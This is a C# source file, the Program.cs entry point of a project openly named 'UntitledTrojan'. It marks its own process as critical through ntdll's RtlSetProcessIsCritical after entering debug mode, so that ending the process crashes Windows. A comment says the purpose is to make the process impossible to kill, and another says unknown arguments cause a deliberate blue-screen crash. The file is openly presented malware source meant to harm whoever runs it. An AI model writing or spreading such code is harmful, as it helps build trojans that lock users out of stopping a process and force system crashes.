using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan.Tools;

namespace UntitledTrojan
{
    internal static class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        internal static MainForm main;

        internal static void Main(string[] args)
        {
            // Arguments for different things
            if (args.Length < 1)
            {
                // User just opened the trojan.
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                if (Failsafe.FailMain())
                {
                    // Make sure that this process can't be killed
                    MakeUnclosable();
                    // Open main form
                    main = new MainForm();
                    Application.Run(main);
                }
            }
            else
            {
                MakeUnclosable();
                switch (args[1])
                {
                    case "/s":
                        // This is shell one.
                        break;
                    default:
                        // Unknown argument. BSOD.
                        Crash();
                        break;
                }
            }
        }

        internal static void MakeUnclosable()
        {
            // Make itself a critical process
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        internal static void Crash()
        {
            // Kill itself
            Process.GetCurrentProcess().Kill();
        }
    }
}
